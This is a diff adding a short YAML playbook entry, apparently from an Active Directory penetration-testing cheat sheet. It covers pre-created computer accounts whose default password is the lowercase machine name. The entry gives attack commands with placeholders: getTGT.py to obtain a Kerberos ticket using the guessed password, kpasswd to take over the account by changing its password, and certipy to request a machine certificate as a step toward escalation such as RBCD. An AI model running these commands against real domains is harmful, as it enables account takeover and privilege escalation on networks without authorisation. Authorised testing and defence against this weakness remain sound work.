@@ -1,0 +1,13 @@
+name: PreCreatedComputer
+description: Pre-created computer accounts often have default password = lowercase computer name
+commands:
+- '# Try default password (lowercase computer name)'
+- getTGT.py -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER>$:<computername_lowercase>'
+- ''
+- '# If password known, change it'
+- kpasswd <COMPUTER>$
+- ''
+- '# Once authenticated - request certificate or set up RBCD'
+- certipy req -u '<COMPUTER>$' -p '<PASSWORD>' -ca '<CA>' -template 'Machine' -dc-ip <DC_IP>
+opsec: []
+references: []
